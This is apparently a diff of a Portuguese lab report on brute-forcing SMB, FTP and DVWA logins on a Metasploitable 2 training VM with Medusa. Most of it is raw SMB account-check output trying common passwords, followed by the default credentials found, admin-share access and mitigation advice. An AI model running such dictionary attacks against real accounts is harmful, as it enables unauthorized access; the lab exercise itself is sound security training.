-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 11 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 11 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 11 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 11 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 12 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: oracle (13 of 15, 12 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 13 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 13 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 13 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 13 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: tomcat (14 of 15, 13 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: blank (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: 123456 (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: toor (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: root (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 14 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: EOF (15 of 15, 15 complete) Password: EOF (18 of 18 complete)
 
+Credenciais encontradas: msfadmin:msfadmin
+Vulnerabilidade: Conta SMB com senha padrão
+Impacto: Possível acesso remoto e compartilhamento de arquivos administrativos
 
-USUÁRIO: msfadmin
-SENHA: msfadmin
-ACESSO: ADMIN$ - Access Allowed
-Acesso: Compartilhamentos de rede
+## Conclusão
+Durante os testes de força bruta com o Medusa, foram identificadas diversas senhas fracas e credenciais padrão nos serviços FTP, HTTP (DVWA) e SMB do Metasploitable 2.
+Essas falhas demonstram a importância de políticas de segurança de senhas, mudança de credenciais padrão e restrição de acessos remotos.
 
 ## Recomendações de Mitigações:
 
-### FTP
-
-Desativar FTP simples; usar SFTP/FTPS.
-Forçar senhas fortes + política de lockout (bloqueio após N tentativas).
-Monitoramento de tentativas de login e alertas.
-
-### Web (formulários)
-
-Implementar proteção contra brute force: rate limiting, captchas progressivos.
-Política de senhas fortes e verificação em duas etapas (2FA).
-Validar e sanitizar entradas e evitar mensagens de erro que revelem informação de usuário/senha.
-
-### SMB
-
-Desabilitar SMBv1; aplicar patches.
-Implementar lockout, usar autenticação centralizada forte.
-Segmentar rede e restringir acessos SMB por firewall.
+  - Alterar imediatamente senhas padrão.
+  - Implementar autenticação multifator (MFA).
+  - Utilizar listas de senhas seguras.
+  - Limitar tentativas de login (bloqueio temporário).
+  - Monitorar logs de autenticação suspeitos.
